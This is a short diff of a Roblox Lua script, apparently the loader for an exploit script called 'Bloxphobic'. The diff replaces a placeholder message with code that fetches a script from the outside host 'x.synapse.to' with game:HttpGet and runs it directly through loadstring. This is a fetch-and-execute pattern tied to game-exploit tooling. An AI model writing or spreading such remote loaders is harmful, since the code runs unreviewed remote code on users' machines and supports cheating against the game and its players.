@@ -1,1 +1,3 @@
-print("Nothing is here right now, Bloxphobic hasn't been released yet!")
+if game.PlaceId == "" then
+    loadstring(game:HttpGet(("x.synapse.to"),true))()
+end
